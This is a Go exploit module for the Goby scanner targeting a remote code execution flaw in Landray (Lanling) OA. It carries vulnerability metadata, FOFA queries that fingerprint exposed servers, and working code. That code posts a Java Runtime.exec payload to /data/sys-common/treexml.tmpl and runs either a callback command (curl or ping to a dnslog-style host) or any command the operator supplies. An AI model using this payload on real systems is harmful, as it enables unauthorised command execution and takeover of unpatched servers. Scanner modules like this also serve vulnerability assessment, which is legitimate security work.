package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Lanling OA treexml.tmpl remote code execution",
    "Description": "<p>Lanling OA office system is an OFFICE oa tool used for instant office communication.  </p><p>Lanling OA has remote code execution vulnerability.  Successful exploitation of this vulnerability can cause a program to crash or even arbitrary code execution. </p>",
    "Impact": "<p>Lanling OA treexml.tmpl remote code execution</p>",
    "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a>  </p><p>2. Configure access policies and whitelist access on security devices such as firewalls.  </p><p>3. If it is not necessary, prohibit the public network from accessing the system. </p>",
    "Product": "Landray-OA",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Information technology application innovation industry",
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "蓝凌OA treexml.tmpl 远程代码执行",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌oa办公系统是用于即时办公通讯的oa办公工具。</p><p>蓝凌oa存在远程代码执行漏洞。<span style=\"font-size: 16px;\">成功利用此漏洞可导致程序崩溃甚至任意代码执行。</span><br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">攻击者可利用该漏洞在受影响的进程上下文中执行任意代码。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "信创",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Lanling OA treexml.tmpl remote code execution",
            "Product": "Landray-OA",
            "Description": "<p>Lanling OA office system is an OFFICE oa tool used for instant office communication.&nbsp;&nbsp;</p><p>Lanling OA has remote code execution vulnerability.&nbsp;&nbsp;Successful exploitation of this vulnerability can cause a program to crash or even arbitrary code execution.&nbsp;</p>",
            "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a> &nbsp;</p><p>2. Configure access policies and whitelist access on security devices such as firewalls.&nbsp;&nbsp;</p><p>3. If it is not necessary, prohibit the public network from accessing the system.&nbsp;</p>",
            "Impact": "<p>Lanling OA treexml.tmpl remote code execution</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Author": "Xsw6a",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-07-06",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-C-2022-403066"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping -c 1 " + checkUrl
			}
			cfg := httpclient.NewPostRequestConfig("/data/sys-common/treexml.tmpl")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			a := "s_bean=ruleFormulaValidate&script=try {\nProcess child = Runtime.getRuntime().exec(\""
			a = a + cmd + "\");\nInputStream in = child.getInputStream();\nint c;\nwhile ((c = in.read()) != -1) {\nout.print((char)c);\n}\nin.close();\ntry {\nchild.waitFor();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n} catch (IOException e) {\nSystem.err.println(e);\n}"
			cfg.Data = a
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return godclient.PullExists(checkStr, time.Second*10)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			s := ss.Params["AttackType"].(string)
			cfg := httpclient.NewPostRequestConfig("/data/sys-common/treexml.tmpl")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			a := "s_bean=ruleFormulaValidate&script=try {\nProcess child = Runtime.getRuntime().exec(\""
			a = a + s + "\");\nInputStream in = child.getInputStream();\nint c;\nwhile ((c = in.read()) != -1) {\nout.print((char)c);\n}\nin.close();\ntry {\nchild.waitFor();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n} catch (IOException e) {\nSystem.err.println(e);\n}"
			cfg.Data = a
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = "success!"
			}
			return expResult
		},
	))
}
